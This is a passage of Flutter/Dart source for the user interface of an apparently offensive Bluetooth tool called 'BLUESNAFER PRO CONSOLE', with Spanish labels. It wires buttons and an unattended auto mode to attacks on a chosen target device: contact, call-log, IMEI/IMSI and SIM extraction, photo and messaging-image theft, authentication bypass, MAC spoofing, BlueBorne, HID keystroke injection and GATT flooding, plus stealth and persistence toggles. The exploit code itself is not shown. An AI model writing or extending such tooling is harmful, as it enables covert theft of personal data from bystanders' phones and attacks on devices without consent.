                margin: const EdgeInsets.only(right: 4),
                decoration: BoxDecoration(
                  color: Colors.indigoAccent.withValues(alpha: 0.2),
                  borderRadius: BorderRadius.circular(20),
                ),
                child: IconButton(
                  icon: Icon(_isScanning ? Icons.radar : Icons.bluetooth_searching,
                    color: _isScanning ? Colors.greenAccent : Colors.indigoAccent, size: 20),
                  onPressed: _isScanning ? null : _scan,
                  tooltip: 'Escanear',
                  padding: const EdgeInsets.all(8),
                  constraints: const BoxConstraints(),
                ),
              ),
              // Settings menu
              PopupMenuButton<String>(
                icon: const Icon(Icons.tune, color: Colors.white54, size: 20),
                tooltip: 'Configuración',
                onSelected: (value) {
                  switch (value) {
                    case 'parallel':
                      setState(() => _enableParallelExecution = !_enableParallelExecution);
                      _appendLog('⚙️ Paralelo: ${_enableParallelExecution ? "ON" : "OFF"}'); break;
                    case 'adaptive':
                      setState(() => _enableAdaptiveIntelligence = !_enableAdaptiveIntelligence);
                      _appendLog('⚙️ IA: ${_enableAdaptiveIntelligence ? "ON" : "OFF"}'); break;
                    case 'advanced':
                      setState(() => _enableAdvancedSystem = !_enableAdvancedSystem);
                      _appendLog('⚙️ Sistema avanzado: ${_enableAdvancedSystem ? "ON" : "OFF"}'); break;
                    case 'stealth':
                      setState(() => _stealthMode = !_stealthMode);
                      _appendLog('🎭 Sigilo: ${_stealthMode ? "ON" : "OFF"}'); break;
                    case 'persistence':
                      setState(() => _enablePersistence = !_enablePersistence);
                      _appendLog('🕵️ Persistencia: ${_enablePersistence ? "ON" : "OFF"}'); break;
                    case 'patterns':
                      setState(() => _enablePatternAnalysis = !_enablePatternAnalysis);
                      _appendLog('📊 Patrones: ${_enablePatternAnalysis ? "ON" : "OFF"}'); break;
                    case 'network':
                      setState(() => _enableNetworkAnalysis = !_enableNetworkAnalysis);
                      _appendLog('🌐 Red: ${_enableNetworkAnalysis ? "ON" : "OFF"}'); break;
                    case 'bonding':
                      setState(() => _autoBonding = !_autoBonding);
                      _appendLog('🤝 Bonding automático: ${_autoBonding ? "ON (se intentará pareo)" : "OFF (objetivo no emparejado)"}'); break;
                    case 'auto':
                      if (_selectedDevice != null) _startUnattendedMode();
                      break;
                    case 'report':
                      _showAutomatedReport(); break;
                  }
                },
                itemBuilder: (context) => [
                  CheckedPopupMenuItem(value: 'parallel', checked: _enableParallelExecution, child: const Text('Paralelo', style: TextStyle(fontSize: 13))),
                  CheckedPopupMenuItem(value: 'adaptive', checked: _enableAdaptiveIntelligence, child: const Text('IA adaptativa', style: TextStyle(fontSize: 13))),
                  CheckedPopupMenuItem(value: 'advanced', checked: _enableAdvancedSystem, child: const Text('Sistema avanzado', style: TextStyle(fontSize: 13))),
                  CheckedPopupMenuItem(value: 'stealth', checked: _stealthMode, child: const Text('Sigilo', style: TextStyle(fontSize: 13))),
                  CheckedPopupMenuItem(value: 'persistence', checked: _enablePersistence, child: const Text('Persistencia', style: TextStyle(fontSize: 13))),
                  CheckedPopupMenuItem(value: 'patterns', checked: _enablePatternAnalysis, child: const Text('Análisis patrones', style: TextStyle(fontSize: 13))),
                  CheckedPopupMenuItem(value: 'network', checked: _enableNetworkAnalysis, child: const Text('Análisis de red', style: TextStyle(fontSize: 13))),
                  CheckedPopupMenuItem(value: 'bonding', checked: _autoBonding, child: const Text('Bonding automático', style: TextStyle(fontSize: 13))),
                  const PopupMenuDivider(),
                  const PopupMenuItem(value: 'auto', child: Text('▶ Iniciar automático', style: TextStyle(fontSize: 13))),
                  const PopupMenuItem(value: 'report', child: Text('📊 Ver reporte', style: TextStyle(fontSize: 13))),
                ],
              ),
            ],
          ),
          backgroundColor: const Color(0xFF020617),
          elevation: 0,
        ),
      ),
      body: SafeArea(
        child: Column(
          children: [
            _buildTargetHud(),
            Expanded(
              child: TabBarView(
                controller: _tabController,
                children: [
                  _buildHomeTab(),
                  _buildAiTab(),
                ],
              ),
            ),
          ],
        ),
      ),
      bottomNavigationBar: _buildBottomTabBar(),
    );
  }

  Widget _buildBottomTabBar() {
    return Container(
      decoration: const BoxDecoration(
        color: Color(0xFF0B1220),
        border: Border(top: BorderSide(color: Colors.white10)),
      ),
      child: SafeArea(
        top: false,
        child: TabBar(
          controller: _tabController,
          indicatorColor: Colors.cyanAccent,
          indicatorSize: TabBarIndicatorSize.label,
          labelColor: Colors.cyanAccent,
          unselectedLabelColor: Colors.white38,
          labelStyle: const TextStyle(fontSize: 10, fontWeight: FontWeight.bold),
          unselectedLabelStyle: const TextStyle(fontSize: 10),
          tabs: const [
            Tab(icon: Icon(Icons.radar, size: 18), text: 'RADAR'),
            Tab(icon: Icon(Icons.psychology, size: 18), text: 'DATOS'),
          ],
        ),
      ),
    );
  }


  Widget _buildTargetHud() {
    final displayName = _selectedDevice == null
        ? 'SIN OBJETIVO SELECCIONADO'
        : device_utils.getDeviceDisplayName(_selectedDevice!);
    final addr = _selectedDevice?['address']?.toString() ?? '—';
    final vendor = _selectedDevice == null ? 'RADAR' : _getManufacturer(addr);
    String hint = _selectedDevice == null
        ? 'Escanea y toca un dispositivo para fijarlo como objetivo'
        : _getQuickGuide();

    return Container(
      width: double.infinity,
      margin: const EdgeInsets.symmetric(horizontal: 16, vertical: 4),
      padding: const EdgeInsets.all(8),
      decoration: BoxDecoration(color: Colors.indigoAccent.withValues(alpha: 0.1), borderRadius: BorderRadius.circular(12), border: Border.all(color: Colors.indigoAccent.withValues(alpha: 0.3))),
      child: Column(
        crossAxisAlignment: CrossAxisAlignment.start,
        mainAxisSize: MainAxisSize.min,
        children: [
          Row(
            children: [
              Icon(Icons.center_focus_strong, color: Colors.indigoAccent, size: 16),
              const SizedBox(width: 8),
              Expanded(
                child: Text(
                  '$displayName | $vendor | $addr',
                  style: const TextStyle(color: Colors.white, fontWeight: FontWeight.bold, fontSize: 10),
                  maxLines: 2,
                  overflow: TextOverflow.ellipsis,
                ),
              ),
              if (_aiPrediction.isNotEmpty) Icon(Icons.verified_user, color: Colors.cyanAccent, size: 14),
            ],
          ),
          const SizedBox(height: 4),
          GestureDetector(
            onTap: _selectedDevice == null ? null : _navigateToSuggestion,
            child: Container(
              padding: const EdgeInsets.symmetric(horizontal: 8, vertical: 4),
              decoration: BoxDecoration(color: Colors.cyanAccent.withValues(alpha: 0.1), borderRadius: BorderRadius.circular(6)),
              child: Row(
                children: [
                  Icon(Icons.touch_app, color: Colors.cyanAccent, size: 12),
                  const SizedBox(width: 4),
                  Expanded(
                    child: Text(
                      hint,
                      style: const TextStyle(color: Colors.cyanAccent, fontSize: 10, fontWeight: FontWeight.bold),
                      maxLines: 2,
                      overflow: TextOverflow.ellipsis,
                    ),
                  ),
                ],
              ),
            ),
          ),
          const SizedBox(height: 6),
          if (_sessionResumable)
            SizedBox(
              width: double.infinity,
              height: 40,
              child: ElevatedButton(
                style: ElevatedButton.styleFrom(
                  backgroundColor: Colors.amberAccent,
                  foregroundColor: Colors.black,
                ),
                onPressed: _resumeSession,
                child: const FittedBox(
                  fit: BoxFit.scaleDown,
                  child: Row(
                    mainAxisSize: MainAxisSize.min,
                    children: [
                      Icon(Icons.history, size: 18),
                      SizedBox(width: 6),
                      Text('♻️ REANUDAR SESIÓN INTERRUMPIDA',
                          style: TextStyle(fontSize: 12, fontWeight: FontWeight.bold)),
                    ],
                  ),
                ),
              ),
            ),
          if (_sessionResumable) const SizedBox(height: 6),
          SizedBox(
            width: double.infinity,
            height: 44,
            child: ElevatedButton(
              style: ElevatedButton.styleFrom(
                backgroundColor: _isUnattendedRunning ? Colors.redAccent : Colors.greenAccent,
                foregroundColor: Colors.black,
                disabledBackgroundColor: Colors.white10,
                disabledForegroundColor: Colors.white30,
                shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(10)),
              ),
              onPressed: _selectedDevice == null ? null : _startUnattendedMode,
              child: FittedBox(
                fit: BoxFit.scaleDown,
                child: Row(
                  mainAxisSize: MainAxisSize.min,
                  children: [
                    Icon(_isUnattendedRunning ? Icons.stop : Icons.auto_mode, size: 20),
                    const SizedBox(width: 6),
                    Text(
                      _isUnattendedRunning
                          ? 'DETENER MODO AUTOMÁTICO'
                          : (_selectedDevice == null ? 'SELECCIONA UN OBJETIVO PARA INICIAR' : 'INICIAR MODO AUTOMÁTICO'),
                      style: const TextStyle(fontSize: 13, fontWeight: FontWeight.bold, letterSpacing: 0.5),
                    ),
                  ],
                ),
              ),
            ),
          ),
        ],
      ),
    );
  }

  Widget _buildHomeTab() {
    return Column(children: [
      Expanded(
        child: _devices.isEmpty
          ? Center(child: Column(mainAxisAlignment: MainAxisAlignment.center, children: [
              Container(padding: const EdgeInsets.all(32), decoration: BoxDecoration(color: Colors.white.withValues(alpha: 0.02), shape: BoxShape.circle), child: const Icon(Icons.radar, size: 64, color: Colors.white10)),
              const SizedBox(height: 24),
              const Text('SIN OBJETIVOS ACTIVOS', style: TextStyle(color: Colors.white24, fontSize: 14, fontWeight: FontWeight.bold, letterSpacing: 1)),
              const SizedBox(height: 40),
              SizedBox(width: 200, child: ElevatedButton.icon(icon: const Icon(Icons.radar), label: const Text('ESCANEAR'), onPressed: _scan)),
            ]))
          : ListView.builder(
              padding: const EdgeInsets.all(16), itemCount: _devices.length,
              itemBuilder: (context, i) {
                final device = _devices[i];
                final addr = device['address']?.toString() ?? '??:??:??';
                final displayName = device_utils.getDeviceDisplayName(device);
                final isSelected = _selectedDevice == device;
                return GestureDetector(
                  onTap: () {
                    setState(() {
                      _selectedDevice = device;
                      _appendLog('🎯 LOCK: $displayName');
                    });
                    _analyzeWithAI(device);
                    _getSuggestion();
                    _saveState(); // Guardar selección
                  },
                  onLongPress: () => _startUnattendedMode(),
                  child: Card(margin: const EdgeInsets.only(bottom: 12), child: Padding(padding: const EdgeInsets.all(16), child: Row(children: [
                    Container(padding: const EdgeInsets.all(10), decoration: BoxDecoration(color: (isSelected ? Colors.indigoAccent : Colors.white).withValues(alpha: 0.05), borderRadius: BorderRadius.circular(12)), child: Icon(_getDeviceIcon(device_utils.detectDeviceType(device)), color: isSelected ? Colors.indigoAccent : Colors.white54, size: 24)),
                    const SizedBox(width: 16),
                    Expanded(child: Column(crossAxisAlignment: CrossAxisAlignment.start, children: [
                      Text(displayName, style: TextStyle(color: isSelected ? Colors.indigoAccent : Colors.white, fontWeight: FontWeight.bold, fontSize: 14)),
                      const SizedBox(height: 4),
                      Row(children: [
                        Container(padding: const EdgeInsets.symmetric(horizontal: 6, vertical: 2), decoration: BoxDecoration(color: Colors.purpleAccent.withValues(alpha: 0.15), borderRadius: BorderRadius.circular(4)),
                          child: Text(device_utils.detectDeviceType(device).toUpperCase(), style: const TextStyle(color: Colors.purpleAccent, fontSize: 9, fontWeight: FontWeight.bold))),
                        const SizedBox(width: 8),
                        Flexible(
                          child: Text('$addr | ${device['rssi']} dBm', style: const TextStyle(color: Colors.white24, fontSize: 9, fontFamily: 'monospace'), overflow: TextOverflow.ellipsis, maxLines: 1),
                        ),
                      ]),
                    ])),
                    if (isSelected) const Icon(Icons.check_circle, color: Colors.greenAccent, size: 20),
                  ]))),
                );
              },
            ),
      ),
      _buildTerminalBar(),
    ]);
  }

  bool _consoleExpanded = true;

  // Rompe palabras largas sin espacios para que softWrap pueda dividirlas.
  // Sin esto, rutas/payloads/MACs largos desbordan la consola (rayas).
  String _wrapLogText(String s) {
    const zwsp = '\u200B';
    final buffer = StringBuffer();
    var run = 0;
    for (final ch in s.split('')) {
      if (ch == ' ') {
        run = 0;
        buffer.write(ch);
      } else {
        run++;
        buffer.write(ch);
        if (run >= 60) {
          buffer.write(zwsp);
          run = 0;
        }
      }
    }
    return buffer.toString();
  }

  Widget _buildTerminalBar() {
    return Container(
      height: _consoleExpanded ? 280 : 40,
      width: double.infinity,
      margin: const EdgeInsets.fromLTRB(16, 0, 16, 0),
      padding: const EdgeInsets.all(12),
      decoration: const BoxDecoration(color: Color(0xFF0F172A), borderRadius: BorderRadius.vertical(top: Radius.circular(20))),
      child: Column(crossAxisAlignment: CrossAxisAlignment.start, children: [
        Row(children: [
          Container(padding: const EdgeInsets.all(4), decoration: BoxDecoration(color: Colors.cyanAccent.withValues(alpha: 0.15), borderRadius: BorderRadius.circular(12), border: Border.all(color: Colors.cyanAccent.withValues(alpha: 0.3), width: 1)), child: const Icon(Icons.bluetooth, color: Colors.cyanAccent, size: 12)),
          const SizedBox(width: 8),
          const Text('BLUESNAFER PRO CONSOLE', style: TextStyle(color: Colors.cyanAccent, fontSize: 10, fontWeight: FontWeight.bold, letterSpacing: 1)),
          const Spacer(),
          if (_consoleExpanded) ...[
            IconButton(icon: const Icon(Icons.save_alt, color: Colors.blue, size: 16), onPressed: _exportLogs, tooltip: 'Exportar logs', padding: EdgeInsets.zero, constraints: const BoxConstraints()),
            const SizedBox(width: 8),
            IconButton(icon: const Icon(Icons.delete_outline, color: Colors.redAccent, size: 16), onPressed: () { setState(() => _log = ['SISTEMA OPERATIVO - STANDBY']); }, tooltip: 'Limpiar consola', padding: EdgeInsets.zero, constraints: const BoxConstraints()),
            const SizedBox(width: 8),
          ],
          IconButton(
            icon: Icon(_consoleExpanded ? Icons.keyboard_arrow_down : Icons.keyboard_arrow_up, color: Colors.white38, size: 18),
            onPressed: () => setState(() => _consoleExpanded = !_consoleExpanded),
            tooltip: _consoleExpanded ? 'Minimizar consola' : 'Expandir consola',
            padding: EdgeInsets.zero,
            constraints: const BoxConstraints(),
          ),
        ]),
        if (_consoleExpanded) ...[
          const SizedBox(height: 4),
          const Divider(color: Colors.white10, height: 1),
          Expanded(
            child: ListView.builder(
              controller: _logScrollController,
              itemCount: _log.length,
              itemBuilder: (context, i) {
                final entry = _log[i];
                // Color-code by type
                Color? textColor;
                if (entry.startsWith('✅') || entry.contains('ÉXITO') || entry.contains('OK')) {
                  textColor = Colors.greenAccent;
                } else if (entry.startsWith('❌') || entry.contains('FALL') || entry.contains('ERROR')) {
                  textColor = Colors.redAccent;
                } else if (entry.startsWith('⚡') || entry.startsWith('🎯')) {
                  textColor = Colors.orangeAccent;
                } else if (entry.startsWith('📡')) {
                  textColor = Colors.purpleAccent;
                } else if (entry.startsWith('⚠️')) {
                  textColor = Colors.amber;
                } else if (entry.startsWith('💥')) {
                  textColor = Colors.red;
                } else {
                  textColor = Colors.cyanAccent;
                }
                return Padding(
                  padding: const EdgeInsets.only(bottom: 2),
                  child: Text(_wrapLogText(entry), style: TextStyle(color: textColor, fontSize: 10, fontFamily: 'monospace'), softWrap: true),
                );
              },
            ),
          ),
        ],
      ]),
    );
  }

  Widget _buildAiTab() {
    return ListView(padding: const EdgeInsets.all(16), children: [
      // Panel de datos recolectados del objetivo (siempre visible)
      if (_collectedData.isNotEmpty) ...[
        _buildDataPanel(),
        const SizedBox(height: 12),
      ],
      // ===== DIAGNÓSTICO DE ATAQUES FALLIDOS =====
      if (_attackDiagnostics.isNotEmpty) ...[
        _buildCollapsibleSection(
          title: '🩺 DIAGNÓSTICO',
          subtitle: '${_attackDiagnostics.length} ataques fallidos y sus causas',
          icon: Icons.healing,
          color: Colors.redAccent,
          initiallyExpanded: _collectedData.isEmpty,
          children: [
            _buildDiagnosticsPanel(),
          ],
        ),
        const SizedBox(height: 12),
      ],
      // ===== RECONOCIMIENTO =====
      _buildCollapsibleSection(
        title: '📡 RECONOCIMIENTO',
        subtitle: 'Servicios expuestos (SDP)',
        icon: Icons.search,
        color: Colors.cyanAccent,
        initiallyExpanded: _sdpServices.isNotEmpty,
        children: [
          _buildAutoRunCard('SDP DISCOVER', 'Ejecutar escaneo SDP ahora', onTap: () => _sdpDiscover()),
          if (_sdpServices.isNotEmpty) ...[
            const SizedBox(height: 8),
            _buildSDPResultsPanel(),
          ],
        ],
      ),
      // ===== DATOS SIN PAREO (BLE/GATT) =====
      if (_gattDump.isNotEmpty) ...[
        _buildCollapsibleSection(
          title: '📶 BLE / GATT — DATOS SIN PAREO',
          subtitle: '${_gattDump.length} valores leídos sin emparejamiento',
          icon: Icons.bluetooth_searching,
          color: Colors.greenAccent,
          initiallyExpanded: true,
          children: [
            _buildGattDumpPanel(),
          ],
        ),
        const SizedBox(height: 12),
      ],
      // ===== DATOS PERSONALES =====
      _buildCollapsibleSection(
        title: '📇 DATOS PERSONALES',
        subtitle: 'Contactos, llamadas, identidad y SIM',
        icon: Icons.contacts,
        color: Colors.orange,
        initiallyExpanded: _pbapContacts.isNotEmpty || _identityExtractionResult != null,
        children: [
          _buildAutoRunAction('PBAP contactos + llamadas', 'Ejecutar extracción PBAP completa', onTap: () => _pbapExtract('all'), icon: Icons.contacts),
          _buildAutoRunAction('AT Identity (IMEI/IMSI)', 'Ejecutar extracción de identidad', onTap: () => _extractAtIdentity(), icon: Icons.fingerprint),
          _buildAutoRunAction('SIM vía SAP (ICCID)', 'Ejecutar extracción SIM', onTap: () => _sapExtract(), icon: Icons.sim_card),
          if (_pbapContacts.isNotEmpty || _pbapCalls.isNotEmpty) ...[
            const SizedBox(height: 8),
            _buildPBAPResultsPanel(),
          ],
          if (_identityExtractionResult != null) ...[
            const SizedBox(height: 8),
            _buildIdentityResultPanel(),
          ],
        ],
      ),
      // ===== GALERÍA DEL OBJETIVO =====
      _buildCollapsibleSection(
        title: '📸 GALERÍA DEL OBJETIVO',
        subtitle: 'Fotos y capturas (OBEX FTP)',
        icon: Icons.photo_library,
        color: Colors.pinkAccent,
        initiallyExpanded: _extractedImages.isNotEmpty,
        children: [
          _buildAutoRunCard('EXTRAER FOTOS vía OBEX FTP', 'Ejecutar extracción de galería ahora', onTap: () => _extractPhotos()),
          if (_extractedImages.isNotEmpty) ...[
            const SizedBox(height: 8),
            _buildGalleryPanel(),
          ],
        ],
      ),
      // ===== EXTRACCIÓN MODERNA DE IMÁGENES =====
      _buildCollapsibleSection(
        title: '📸 EXTRACCIÓN MODERNA',
        subtitle: 'MediaStore, GATT, OPP Server, MAP (alternativas a OBEX FTP)',
        icon: Icons.cloud_download,
        color: Colors.teal,
        initiallyExpanded: _mediastoreEnhanced.isNotEmpty || _gattImages.isNotEmpty || _oppReceivedImages.isNotEmpty || _mapImages.isNotEmpty,
        children: [
          _buildAutoRunAction('MediaStore Enhanced (Android 10+)', 'Ejecutar MediaStore ahora', onTap: () => _mediastoreEnhancedExtract(), icon: Icons.photo_album),
          _buildAutoRunAction('GATT Image Read (IoT/cámaras)', 'Ejecutar GATT image read', onTap: () => _gattImageRead(), icon: Icons.sensors),
          _buildAutoRunAction('OPP Server Mode (target envía)', 'Abrir receptor OPP', onTap: () => _oppServerMode(), icon: Icons.call_received),
          _buildAutoRunAction('MAP Image Extract (WhatsApp/Telegram)', 'Ejecutar MAP image extract', onTap: () => _mapImageExtract(), icon: Icons.message),
          if (_mediastoreEnhanced.isNotEmpty) ...[
            const SizedBox(height: 8),
            _buildModernExtractionPanel('MediaStore', _mediastoreEnhanced, Colors.teal),
          ],
          if (_gattImages.isNotEmpty) ...[
            const SizedBox(height: 8),
            _buildModernExtractionPanel('GATT', _gattImages, Colors.cyan),
          ],
          if (_oppReceivedImages.isNotEmpty) ...[
            const SizedBox(height: 8),
            _buildModernExtractionPanel('OPP Server', _oppReceivedImages, Colors.green),
          ],
          if (_mapImages.isNotEmpty) ...[
            const SizedBox(height: 8),
            _buildModernExtractionPanel('MAP', _mapImages, Colors.orange),
          ],
        ],
      ),
      // ===== TRANSFERENCIA DE ARCHIVOS =====
      _buildCollapsibleSection(
        title: '📤 TRANSFERENCIA DE ARCHIVOS',
        subtitle: 'OBEX FTP, OPP, BLE y MediaStore',
        icon: Icons.swap_vert,
        color: Colors.greenAccent,
        initiallyExpanded: _obexFiles.isNotEmpty,
        children: [
          _buildAutoRunAction('OBEX FTP scan · OPP Push · OBEX BLE · MediaStore', 'Integrado en el modo automático'),
          if (_obexFiles.isNotEmpty) ...[
            const SizedBox(height: 8),
            Container(
              padding: const EdgeInsets.all(12),
              decoration: BoxDecoration(
                color: Colors.green[900]!.withValues(alpha: 0.2),
                borderRadius: BorderRadius.circular(12),
                border: Border.all(color: Colors.greenAccent.withValues(alpha: 0.3)),
              ),
              child: Column(
                crossAxisAlignment: CrossAxisAlignment.start,
                children: [
                  Row(
                    children: [
                      Icon(Icons.folder_open, color: Colors.greenAccent, size: 16),
                      const SizedBox(width: 8),
                      Text('${_obexFiles.length} archivos encontrados', style: const TextStyle(color: Colors.greenAccent, fontWeight: FontWeight.bold, fontSize: 12)),
                      const Spacer(),
                      TextButton.icon(
                        icon: const Icon(Icons.download, size: 14),
                        label: const Text('EXPLORAR', style: TextStyle(fontSize: 11)),
                        style: TextButton.styleFrom(foregroundColor: Colors.greenAccent),
                        onPressed: () => _openFileBrowser(),
                      ),
                    ],
                  ),
                  const SizedBox(height: 8),
                  ..._obexFiles.take(10).map((f) => Padding(
                    padding: const EdgeInsets.only(bottom: 2),
                    child: Row(
                      children: [
                        Icon(f['type'] == 'directory' ? Icons.folder : Icons.insert_drive_file, color: f['type'] == 'directory' ? Colors.amber : Colors.cyanAccent, size: 12),
                        const SizedBox(width: 4),
                        Expanded(
                          child: Text(f['name']?.toString() ?? '?', style: const TextStyle(color: Colors.white70, fontSize: 10, fontFamily: 'monospace'), overflow: TextOverflow.ellipsis),
                        ),
                        Text(f['size']?.toString() ?? '0', style: const TextStyle(color: Colors.white38, fontSize: 9)),
                      ],
                    ),
                  )),
                  if (_obexFiles.length > 10)
                    Padding(
                      padding: const EdgeInsets.only(top: 4),
                      child: Text('... y ${_obexFiles.length - 10} más', style: const TextStyle(color: Colors.white38, fontSize: 9)),
                    ),
                ],
              ),
            ),
          ],
        ],
      ),
      // ===== AUTH BYPASS =====
      _buildCollapsibleSection(
        title: '🔓 AUTH BYPASS',
        subtitle: 'OffensiveCon 2025 - Bluetooth Auth Bypass',
        icon: Icons.lock_open,
        color: Colors.redAccent,
        children: [
          _buildAutoRunAction('Quick Connect Race', 'Intentar bypas de Quick Connect', onTap: () => _bypassQuickConnect(), icon: Icons.bolt),
          _buildAutoRunAction('MAC Spoof Trusted Device', 'Spoofear MAC de dispositivo confiable', onTap: () => _bypassSpoofDevice(), icon: Icons.wifi_find),
          _buildAutoRunAction('OBEX Trust Abuse', 'Abusar de confianza OBEX', onTap: () => _bypassOBEXTrust(), icon: Icons.lock_open),
        ],
      ),
      // ===== EXPLOITS AVANZADOS =====
      _buildCollapsibleSection(
        title: '🦠 EXPLOITS AVANZADOS',
        subtitle: 'BlueBorne, Mirror, HID, Spoofing...',
        icon: Icons.security,
        color: Colors.red,
        children: [
          _buildAutoRunAction('BlueBorne', 'Ejecutar BlueBorne', onTap: () => _blueBorneAttack(), icon: Icons.bug_report),
          _buildAutoRunAction('Mirror Profile', 'Ejecutar Mirror Profile', onTap: () => _mirrorProfile(), icon: Icons.copy_all),
          _buildAutoRunAction('AT Injection', 'Inyección de comandos AT', onTap: () => _atInjection(), icon: Icons.terminal),
          _buildAutoRunAction('Full Scan', 'Análisis completo de vulnerabilidades', onTap: () => _fullScan(), icon: Icons.search),
          _buildAutoRunAction('BT Spoofing', 'Spoofear dispositivo', onTap: () => _btSpoofing(), icon: Icons.face_retouching_natural),
          _buildAutoRunAction('HID Inject', 'Inyección de teclado HID', onTap: () => _hidInject(), icon: Icons.keyboard),
          _buildAutoRunAction('Download File', 'Descargar archivo del objetivo', onTap: () => _downloadFile(), icon: Icons.download),
          _buildAutoRunAction('OBEX FTP Scan', 'Escaneo de archivos OBEX', onTap: () => _obexScan(), icon: Icons.folder_open),
          _buildAutoRunAction('OPP Push File', 'Enviar archivo vía OPP', onTap: () => _oppPushFile(), icon: Icons.upload_file),
        ],
      ),
      // ===== RESULTS DASHBOARD =====
      if (_hasResults()) ...[
        _buildSectionTitle('📊 RESULTS DASHBOARD', 'Datos extraídos de ataques'),
        const SizedBox(height: 12),
        _buildResultsDashboard(),
        const SizedBox(height: 12),
      ],
      // ===== VULNERABILITY ASSESSMENT =====
      if (_discoveryData.isNotEmpty) ...[
        _buildSectionTitle('VULNERABILITY ASSESSMENT', 'Análisis heurístico'),
        const SizedBox(height: 12),
        SmartSuggestionPanel(
          discoveryData: _discoveryData,
          onCommandSelected: (cmd) {
            if (cmd.contains(':')) {
              final parts = cmd.split(':');
              final type = parts[0];
              final subCmd = parts.length > 1 ? parts[1] : '';
              
              // Mapear tipos del SmartSuggestionPanel a handlers reales
              String actualType = type;
              String actualCmd = subCmd;
              
              if (type == 'sdp') { actualType = 'sdp_discover'; actualCmd = 'scan'; }
              if (type == 'file') { actualType = 'file_exfil'; actualCmd = 'scan'; }
              if (type == 'vuln') {
                if (subCmd.contains('obex') || subCmd.contains('ftp')) { actualType = 'file_exfil'; actualCmd = 'scan'; }
                else if (subCmd.contains('at') || subCmd.contains('injection')) { actualType = 'at_injection'; actualCmd = ''; }
                else if (subCmd.contains('ble') || subCmd.contains('reconnection')) { actualType = 'dos'; actualCmd = 'gatt_flood'; }
                else { actualType = 'full_scan'; actualCmd = 'scan'; }
              }
              if (type == 'ble') { actualType = 'btlejack'; actualCmd = subCmd.contains('enum') ? 'scan' : subCmd; }
              if (type == 'image') { actualType = 'file_exfil'; actualCmd = 'scan'; }
              if (type == 'terminal') { actualType = 'at_injection'; actualCmd = ''; }
              
              _attack(actualType, command: actualCmd.isEmpty ? subCmd : actualCmd);
            } else {
              String type = 'btlejack';
              if (cmd.contains('flood') || cmd.contains('mtu') || cmd.contains('dos')) type = 'dos';
              if (cmd.contains('hid') || cmd.contains('notepad') || cmd.contains('inject')) type = 'hid';
              if (cmd.contains('terminal') || cmd.contains('at_')) type = 'at_injection';
              if (cmd.contains('obex') || cmd.contains('file') || cmd.contains('pbap')) type = 'file_exfil';
              if (cmd.contains('sdp') || cmd.contains('discover')) type = 'sdp_discover';
              if (cmd.contains('bypass') || cmd.contains('quick') || cmd.contains('spoof') || cmd.contains('trust')) type = 'bypass';
              if (cmd.contains('blueborne')) type = 'blueborne';
              if (cmd.contains('mirror') || cmd.contains('clone')) type = 'mirror_profile';
              if (cmd.contains('scan') || cmd.contains('sniff') || cmd.contains('hijack') || cmd.contains('jam')) type = 'btlejack';
              _attack(type, command: cmd);
            }
          },
          isLoading: false,
          successRates: _successRates,
        ),
        const SizedBox(height: 20),
      ],
    ]);
  }

  // Decodifica hex a ASCII imprimible (para valores GATT legibles)
  String _hexToAscii(String hex) {
    final buf = StringBuffer();
    for (int i = 0; i + 1 < hex.length; i += 2) {
      final code = int.tryParse(hex.substring(i, i + 2), radix: 16);
      if (code == null) continue;
      if (code >= 0x20 && code < 0x7F) {
        buf.writeCharCode(code);
      } else if (code == 0x0A || code == 0x0D) {
        buf.write(' ');
      }
    }
    return buf.toString();
  }

  // Panel del dump GATT obtenido sin pareo
  Widget _buildGattDumpPanel() {
    return Column(
      crossAxisAlignment: CrossAxisAlignment.start,
      children: [
        Container(
          padding: const EdgeInsets.all(10),
          decoration: BoxDecoration(
            color: Colors.green[900]!.withOpacity(0.3),
            borderRadius: BorderRadius.circular(8),
            border: Border.all(color: Colors.greenAccent.withOpacity(0.3)),
          ),
          child: const Text(
            'Valores leídos de características BLE sin cifrar — no se requirió emparejamiento. '
            'Los valores en texto son decodificados de hex; los ilegibles se muestran como bytes.',
            style: TextStyle(fontSize: 11, color: Colors.white70),
          ),
        ),
        const SizedBox(height: 8),
        ..._gattDump.map((entry) {
          final path = entry['path']?.toString() ?? '';
          final ascii = entry['ascii']?.toString() ?? '';
          final hex = entry['hex']?.toString() ?? '';
          final readable = ascii.isNotEmpty;
          return Container(
            margin: const EdgeInsets.only(bottom: 6),
            padding: const EdgeInsets.all(8),
            decoration: BoxDecoration(
              color: Colors.black26,
              borderRadius: BorderRadius.circular(6),
            ),
            child: Column(
              crossAxisAlignment: CrossAxisAlignment.start,
              children: [
                Row(children: [
                  Icon(readable ? Icons.text_fields : Icons.memory, size: 13, color: Colors.greenAccent),
                  const SizedBox(width: 5),
                  Expanded(child: Text(path, style: const TextStyle(fontSize: 10, fontFamily: 'monospace', color: Colors.cyanAccent))),
                ]),
                const SizedBox(height: 3),
                SelectableText(
                  readable ? '"$ascii"' : 'hex: $hex',
                  style: TextStyle(fontSize: 11, fontFamily: 'monospace', color: readable ? Colors.greenAccent : Colors.white54),
                ),
              ],
            ),
          );
        }),
      ],
    );
  }

  // Sección colapsable para mantener la UI organizada y sin saturación
  Widget _buildCollapsibleSection({
    required String title,
    required String subtitle,
    required IconData icon,
    required Color color,
    bool initiallyExpanded = false,
    required List<Widget> children,
  }) {
    return Container(
      margin: const EdgeInsets.only(bottom: 10),
      decoration: BoxDecoration(
        color: Colors.white.withValues(alpha: 0.02),
        borderRadius: BorderRadius.circular(12),
        border: Border.all(color: color.withValues(alpha: 0.15)),
      ),
      child: Theme(
        data: Theme.of(context).copyWith(dividerColor: Colors.transparent),
        child: ExpansionTile(
          initiallyExpanded: initiallyExpanded,
          leading: Container(
            padding: const EdgeInsets.all(8),
            decoration: BoxDecoration(color: color.withValues(alpha: 0.12), borderRadius: BorderRadius.circular(10)),
            child: Icon(icon, color: color, size: 18),
          ),
          title: Text(title, style: const TextStyle(color: Colors.white, fontWeight: FontWeight.bold, fontSize: 12)),
          subtitle: Text(subtitle, style: const TextStyle(color: Colors.white38, fontSize: 10)),
          iconColor: color,
          collapsedIconColor: Colors.white38,
          children: [
            Padding(
              padding: const EdgeInsets.fromLTRB(12, 0, 12, 12),
              child: Column(crossAxisAlignment: CrossAxisAlignment.start, children: children),
            ),
          ],
        ),
      ),
    );
  }

  /// Panel de diagnóstico: cada ataque fallido con su motivo real y una pista accionable.
  Widget _buildDiagnosticsPanel() {
    String hintFor(String reason) {
      final r = reason.toLowerCase();
      if (r.contains('service discovery') || r.contains('socket') || r.contains('read failed') || r.contains('broken pipe') || r.contains('closed')) {
